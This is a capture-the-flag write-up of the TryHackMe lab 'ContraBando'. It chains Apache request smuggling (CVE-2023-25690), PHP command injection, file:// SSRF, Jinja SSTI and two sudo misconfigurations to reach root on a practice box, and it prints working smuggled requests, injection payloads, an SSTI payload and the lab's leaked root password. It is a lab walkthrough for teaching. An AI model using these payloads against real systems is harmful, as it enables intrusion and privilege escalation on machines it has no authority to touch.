---
description: "TryHackMe ContraBando — a maintenance page hides a two-tier Apache setup, and the front-end is version 2.4.55, the last one vulnerable to CVE-2023-25690. A CRLF smuggled through mod_rewrite's decode splits the proxied request, which reaches a backend password generator that pastes POST data straight into exec(). That shell can see an internal Flask app the outside world cannot, and the Flask app fetches any URL you give it and renders the result as a Jinja template — SSRF into SSTI, RCE as the site user. sudo lets that user run a vault script whose [[ == ]] comparison is an unquoted glob, so it doubles as an oracle that leaks /root/password one character at a time. That password is reused for a second sudo rule running a Python 2 script, where input() means eval(). Every command, every flag, and every wrong turn explained for a total beginner."
---

# ContraBando — smuggling a request past Apache, and five more doors behind it

**TryHackMe · challenge: ContraBando · target: `10.x.x.x` (the lab IP changes per lease)**

> **Both flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays — every
> command, every flag on it, the payloads, the controls, and every wrong turn. The flag strings
> themselves teach nothing; printing them just hands the room's answers to the next person. The one
> real secret kept in the clear is `/root/password`, because the final privilege escalation is
> unexplainable without it and *how it is leaked* is the whole lesson of that step.

**The brief.** *"Our company was excited to release our new product, but a recent attack has forced
us to go down for maintenance. They have asked you to conduct a vulnerability assessment to help
identify how the attack occurred. Are you up for it?"*

The room's name is the first hint, and it is a strong one. **ContraBando** is Spanish for
*contraband* / *smuggling*. In web security "smuggling" has a precise meaning — **HTTP request
smuggling** — so that is the leading hypothesis. But a room name is a guess, not evidence, so the
work below confirms it from the server's own responses before betting on it.

## A few words first, for a total beginner

Skip this if you already know it.

- **Port** — a numbered door on a machine; one IP has 65 535 of them. A web server usually listens on
  port 80. "Port 80 is open" is thin; "port 80 is Apache 2.4.55" is gold, because now you can look up
  exactly what *that build* gets wrong.
- **HTTP request** — what a browser sends. `GET` means "give me this page"; `POST` means "here is some
  data, act on it" (a form submit). Every request and reply carries **headers** — extra `Name: value`
  lines the user never sees, like `Server: Apache`.
- **Reverse proxy** — a front server that receives your request and quietly forwards it to a second,
  hidden server ("the back-end"), then relays the reply back. You talk to the front; the back-end does
  the real work. Two servers, one address.
- **RCE** — Remote Code Execution: you get the target to run a command you chose. The prize of most
  web boxes.
- **SSRF** — Server-Side Request Forgery: you make the *server* fetch a URL for you, so it reaches
  places you cannot (its own localhost, an internal-only service).
- **SSTI** — Server-Side Template Injection: your input lands inside a template the server then
  *renders*, so template syntax like `{{7*7}}` gets evaluated — and templates can reach code.

Each term is re-explained the first time it does real work below.

---

## Recon — and a long detour proving the target is even reachable

Before the target: a lesson that has nothing to do with ContraBando and everything to do with not
wasting an hour. The first scans came back with **every port "filtered"** — no answer at all:

```bash
nmap -Pn -n --top-ports 1000 -T4 10.x.x.x
#  Not shown: 1000 filtered tcp ports (no-response)
```

- `-Pn` — "assume the host is up, skip the ping check". TryHackMe machines don't answer pings, so
  without this nmap declares the box dead and scans nothing.
- `-n` — don't do reverse-DNS lookups; there is no DNS for a lab IP, so this just saves time.
- `--top-ports 1000` — check the 1000 most common ports first.
- `filtered / no-response` — nmap sent a connection request and **nothing came back at all**. Not a
  "closed" (which is itself an answer), not an "open" — silence.

**Silence is not evidence.** "Nothing came back" means *either* "the target is firewalled" *or* "my
packet never left the building". You are not allowed to assume which. So instead of reaching for a
bigger scan, prove the channel — the VPN tunnel that carries your traffic to the lab:

```bash
ip -s link show tun0
#   TX: 1802 packets ... RX: 1 packet
```

`tun0` is the VPN network interface. **TX** is packets sent, **RX** is packets received. 1802 out,
**1 back**. Everything you send leaves; *nothing* ever returns. That is not a firewalled target — a
firewalled target still lets your VPN's own control traffic through. This is the tunnel itself being
one-way dead.

A packet capture on the physical network card confirmed it: our probes really do leave the machine
encrypted and reach TryHackMe's VPN gateway; TryHackMe simply returns nothing for this IP. The fix
was on TryHackMe's side (the machine had not finished booting / the VPN session needed a reconnect),
not a scan flag. **Cost of proving the channel: four minutes. Cost of not proving it and scanning
harder: an hour against a network path that carries no return traffic.**

Once the box was actually up, the real scan:

```bash
nmap -Pn -n -p- -T4 --min-rate 1500 10.x.x.x     # -p-  = all 65535 ports
nmap -Pn -n -sV -sC -p 22,80 10.x.x.x            # -sV version detect, -sC default scripts
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
```

`Apache 2.4.55 (Unix)`. Hold onto that exact number — it is the whole ballgame.

## The web app — two servers wearing one coat

The home page is a "COMING SOON" maintenance splash with one link: **`/page/home.html`**. Fetch that
link and compare its headers to the home page's:

```bash
curl -s -i http://10.x.x.x/                 # the maintenance page
curl -s -i http://10.x.x.x/page/home.html   # the linked "beta" page
```

- `curl` — a command-line web client.
- `-s` — silent (no progress bar).
- `-i` — **include the response headers** in the output, not just the page body. The headers are
  where the tell is.

| What you asked for | `Server:` header | Extra header |
|---|---|---|
| `/` (port 80) | `Apache/2.4.55 (Unix)` | — |
| `/page/home.html` | `Apache/2.4.54 (Debian)` | `X-Powered-By: PHP/7.4.33` |

**Two different Apache builds answer, depending on the path.** That is the reverse-proxy shape:
a front-end Apache on port 80, and anything under `/page/` gets forwarded to a *second, hidden*
Apache (the Debian one, with PHP). The `/page/` prefix is the front-end's rewrite rule pointing at
the back-end.

Now the version matters. **Apache 2.4.55 is the last release vulnerable to CVE-2023-25690**, fixed in
2.4.56. That CVE is an **HTTP request smuggling** bug in `mod_proxy` + `mod_rewrite`. The room is
literally named "smuggling", the front-end is the exact vulnerable version, and there is a rewrite
rule feeding a proxy. Hypothesis confirmed by evidence, not by the name.

## What the back-end actually does with `/page/…`

Probe the back-end directly. Ask for `index.php`:

```bash
curl -s http://10.x.x.x/page/index.php
```

It returns **PHP source code, not a rendered page**:

```php
<?php
$page = $_GET['page'];
if (isset($page)) { readfile($page); }
else { header('Location: /index.php?page=home.html'); }
```

So the front-end rule is, in effect:

```
RewriteRule ^/page/(.*)   http://backend:8080/index.php?page=$1   [P]
```

Everything after `/page/` becomes the `page` parameter, and the back-end **`readfile()`s** it. That
`readfile($page)` on attacker-controlled input is an **arbitrary file read** all by itself, before we
even smuggle anything.

### Wrong turn 1 — "everything returns 200, I found everything!"

A quick sweep of paths under `/page/` returned `200 OK` for *every single one*, real or nonsense.
A 100% hit rate is not success — it is a **broken detector**. The test that proves it is a **negative
control**: ask for something that cannot possibly exist.

```bash
curl -s -i http://10.x.x.x/page/ThisCannotPossiblyExist_9f3a2b.html
#  HTTP/1.1 200 OK
#  <b>Warning</b>: readfile(...): failed to open stream: No such file or directory
```

It, too, is `200` — with a **PHP warning** in the body. **PHP warnings ride on a `200` status.** The
real "found / not found" signal is the `failed to open stream` string, *not* the HTTP code. Every
later search used that string, never the status code. (Lesson: a positive and a negative control go
in *every* sweep, and you read the controls before you read the results.)

### Wrong turn 2 — the disappearing leading slash

`/page//etc/passwd` gave `readfile(etc/passwd)` — the leading slash vanished. Apache merges double
slashes and normalises `../` away *before* the rewrite runs, so plain path tricks die on the doorstep.

The fix is that there are **two** URL-decoders in this chain: the front-end decodes the path once, then
PHP decodes the query value again. So **double-encode** the slashes. `/` is `%2f`; encode the `%`
itself and you get `%252f`:

```bash
curl -s --path-as-is "http://10.x.x.x/page/%252fetc%252fpasswd"
#  root:x:0:0:root:/root:/bin/bash
#  ...
```

- `--path-as-is` — stop curl from "helpfully" collapsing the `%252f` sequences.

`/etc/passwd`, read. The double-encoding survives the first decode as `%2f`, gets proxied, and PHP's
second decode turns it into a real `/`. From here a tiny helper `read.sh <path>` reads any file the
back-end user can see.

## The smuggling itself — reaching a script the front-end will not run

Enumerating readable files through that primitive (with proper controls) turned up **`gen.php`**, a
password generator. `readfile()` hands over its source:

```php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}
if (isset($_POST['length'])) { echo generateRandomPassword($_POST['length']); }
```

`$_POST['length']` is glued straight into `exec()`. **Command injection** — if `length` is
`1; somecommand`, the shell runs `somecommand`. But there is a catch that makes this room what it is:
**the front-end only ever proxies to `/index.php?page=…`.** A normal `POST /page/gen.php` is still
rewritten to `index.php`, which just prints the source. **`gen.php` cannot be executed through the
front door at all.**

That is exactly what CVE-2023-25690 is for. When `mod_rewrite` substitutes your data into the proxied
URL, it **URL-decodes** it, and `mod_proxy` writes the result to the back-end **without re-encoding**.
So a `%0d%0a` in your URL becomes a real **CRLF** — a carriage-return + line-feed, the character pair
that ends an HTTP line — inside the request line the proxy sends. That splits one request into two,
and the second one is entirely yours:

```
GET /index.php?page=x HTTP/1.1        <- request 1: the proxy answers this normally
Host: 127.0.0.1

POST /gen.php HTTP/1.1                <- request 2: smuggled in, fully attacker-controlled
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

length=1;id >/var/www/html/pwn.txt 2>&1
```

You detect the split before weaponising it, positively — send `/page/AAA%0d%0aBBB` and watch the
error say `readfile(AAA)`: the `BBB` is *gone*, because it became the start of a second request line.
That truncation, in the app's own words, is the proof.

Two practical snags, both worth keeping as lessons:

1. **Encoded slashes get you a 404.** If you URL-encode the `/` characters in the smuggled request
   too, the front-end rejects `%2f` in a path (`AllowEncodedSlashes` is off by default). Keep the
   slashes literal; only the CRLFs and spaces get encoded.
2. **A redirect only binds the last command.** `id; ls >file` sends only `ls`'s output to the file.
   Wrap the whole thing: `(id; ls) >file`.

For the result, don't set up a listener you have to hope reaches you — **use a channel you already
control**. Have the injected command write its output into the back-end's own web root, then read it
back with the file-read primitive from earlier:

```
smuggled POST body:  length=1;(id) >/var/www/html/pwn.txt 2>&1
then:                curl .../page/pwn.txt   ->  uid=33(www-data) ...
```

**RCE as `www-data`** inside a Docker container. No flag lives in that container, though — it is only
the pivot point.

## Pivot — an internal service the internet cannot see

From inside the container, sweep the private Docker network for other machines:

```bash
for h in 172.18.0.{1..5}; do for p in 22 80 5000 8080; do
  timeout 1 bash -c "echo >/dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $h:$p"; done; done
#  OPEN 172.18.0.1:22   OPEN 172.18.0.1:80   OPEN 172.18.0.1:5000   OPEN 172.18.0.3:8080
```

`/dev/tcp/host/port` is a bash trick: opening it succeeds only if something is listening. `172.18.0.1`
is the Docker gateway — **the host machine itself**. Port **5000** is a service that is *not* exposed
to the outside world. It is a Flask ("Werkzeug") app with a "Fetch Website Content" form taking a
`website_url`. A form that fetches a URL for you is an **SSRF** waiting to happen, and `file://` works:

```
POST http://172.18.0.1:5000/   body: website_url=file:///etc/passwd
->  the HOST's /etc/passwd, including  hansolo:x:1000:1000::/home/hansolo:/bin/bash
```

**Flag 1** is a file in that user's home directory, `hansolo`-owned, so it reads straight out through
this SSRF — no exploit code needed, just `file:///home/hansolo/<the userflag file>`:

```
THM{[redacted]}      # first flag, mask ***{***_****_********_**_**_******}
```

Reading the Flask process's own details (`file:///proc/self/cmdline`, `.../status`) shows it runs as
**hansolo** from `/home/hansolo/app/app.py`, and reading that source reveals the next door.

## SSRF becomes SSTI — code execution as the site user

`app.py`, boiled down:

```python
c.setopt(c.URL, website_url); c.perform()        # fetch whatever URL you gave
content = buffer.getvalue().decode('utf-8')      # the fetched page body
website_content = ''' ... %s ''' % content        # splice it into a template string
return render_template_string(website_content)     # <-- render it as a Jinja2 template
```

The fetched page's **body** is handed to `render_template_string`. Jinja2 templates evaluate anything
in `{{ … }}`. And *you* control what gets fetched, because you choose the URL — so point it at a page
whose body is a Jinja payload. You already own the back-end web root (RCE as www-data), so drop the
payload there and have Flask fetch it:

```
payload file served from the back-end (172.18.0.3:8080):
   {{ cycler.__init__.__globals__.os.popen('<command>').read() }}

Flask fetches it -> render_template_string evaluates it -> runs <command> as hansolo
->  uid=1000(hansolo)  on host "contrabando"
```

That chain — SSRF to reach the app, SSTI to run inside it — is **RCE as hansolo on the host**.

### Wrong turn 3 — I knocked my own target offline

Request smuggling **poisons the proxy's connection pool by design**: every smuggled request leaves an
extra queued response the front-end is holding. Fire dozens of them, fast, at a one-CPU lab VM and the
front-end Apache runs out of healthy workers and stops answering entirely — which looks exactly like
the box crashing. It wasn't the box; it was my traffic. The lesson is old and keeps being true: *when
the target slows down mid-engagement, suspect your own traffic first.* After a restart, the smart move
is to **stop smuggling as soon as possible**: since the SSTI already runs as hansolo, use it to write
your own SSH key into `~/.ssh/authorized_keys` and switch to a normal `ssh` session over the
already-open port 22. One clean connection instead of two smuggled requests per command.

## Root — a comparison that is secretly a glob, and a password worth reusing

As hansolo, ask what you're allowed to run as root:

```bash
sudo -l
#  (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
#  (root)          /usr/bin/python* /opt/generator/app.py
```

`sudo -l` lists your sudo permissions. The first line: hansolo may run `bash /usr/bin/vault` **as root
with no password**. The `vault` script:

```bash
compare () {
    content=$(/usr/bin/cat "$file_to_check")      # $file_to_check = /root/password
    read -s -p "Enter the required input: " user_input
    if [[ $content == $user_input ]]; then        # the bug is on this line
        /usr/bin/cat "$file_to_print"             # $file_to_print = /root/secrets
    fi
}
```

Inside bash's `[[ … == … ]]`, the **right-hand side is a glob pattern, not a literal string**, and
here `$user_input` is **unquoted**. So whatever you type is treated as a wildcard pattern matched
against the contents of `/root/password`. Type a single `*` and it matches *any* password:

```bash
echo '*' | sudo /usr/bin/bash /usr/bin/vault
#  Password matched!
#  <contents of /root/secrets>
```

`/root/secrets`, though, turns out to be a page of Star Wars trivia — a **decoy**, not the flag. The
real prize is that the same bug is a **matching oracle**. Ask "does the password start with `E`?" by
testing the pattern `E*`; the "matched / does not match" answer leaks one character. Walk the alphabet
per position and you reconstruct the whole file:

```
E*  -> match    ->  starts with E
EQ* -> match    ->  ...
->  /root/password = EQu5ehwHcRfZ
```

Now the second sudo line pays off. `(root) /usr/bin/python* /opt/generator/app.py` has **no**
`NOPASSWD`, so it needs hansolo's sudo password — and that password is the very file we just leaked
(**password reuse**). And `app.py` runs under **Python 2**:

```python
secret = input("Any words you want to add to the password? ")
```

In Python 2, **`input()` is `eval(raw_input())`** — it *evaluates* whatever you type as Python code.
So run the allowed command, feed it the password, then the length prompt, then a Python expression that
executes a shell command as root:

```
stdin:  EQu5ehwHcRfZ  \n  8  \n  __import__("os").system("cat /root/root.txt")
        | sudo -S /usr/bin/python2 /opt/generator/app.py
->  uid=0(root)
->  /root/root.txt
```

```
THM{[redacted]}      # second flag, mask ***{***_*****_********}, from /root/root.txt
```

## Cleaning up — leave the box as you found it

An assessment is not finished when you have the flags; it is finished when you have **removed
everything you left behind**:

- the two files written into the back-end container's web root (`pwn.txt`, `s.txt`) — deleted, then
  confirmed gone by re-reading them and getting `failed to open stream`;
- the SSH key added to `~/.ssh/authorized_keys` — removed, then confirmed by an `ssh` attempt that now
  returns `Permission denied`. (A marker written during the exploit proved there was no pre-existing
  `authorized_keys` to restore, so deleting the file was correct, not destructive.)

A web shell or an SSH key left on a shared lab box becomes the *next* person's free foothold. Removing
your own access **last**, and verifying it's gone, is part of the job.

## The whole chain, in one breath

```
Apache 2.4.55 front-end   --CVE-2023-25690 request smuggling-->   reach backend /gen.php
gen.php exec($_POST['length'])  --command injection-->            RCE as www-data (container)
internal Flask :5000 URL fetcher  --SSRF file://-->               read HOST files        => FLAG 1
render_template_string(fetched body)  --SSTI-->                   RCE as hansolo (host)
sudo bash vault, [[ == ]] unquoted glob  --matching oracle-->     leak /root/password
password reuse + sudo python2 input()  --eval-->                  RCE as root            => FLAG 2
```

Six distinct bugs, each one only reachable *through* the previous. The room's brief asked us to
"identify how the attack occurred" — and every link in that chain is a real misconfiguration a real
maintenance rush could leave behind: an out-of-date proxy, a debug generator wired to `exec`, an
internal fetcher with no URL allow-list, a template that renders untrusted content, a clever-but-broken
password gate, and one password used in two places.

### The lessons, collected

- **Silence is not "not there."** Prove the channel before you trust an empty scan — the VPN tunnel
  was one-way dead, and no amount of extra scanning would have shown that.
- **A 100% hit rate is a broken detector.** A negative control in every sweep; read the controls first.
  Here, PHP warnings on a `200` made every path look "found".
- **The version number is the vulnerability.** Apache 2.4.55 → CVE-2023-25690; the room name only
  told you where to look, the header told you it was real.
- **Prefer a success signal on a channel you already control** — write to the web root and read it
  back, rather than hoping a reverse callback reaches you.
- **You can DoS your own target.** Request smuggling poisons connections by design; go slow, and move
  off the fragile primitive (to SSH) the moment you can.
- **`[[ $a == $b ]]` with an unquoted right side is a glob**, and any yes/no comparison is an oracle.
- **Password reuse turns a file read into root** when the leaked value is also a sudo password.
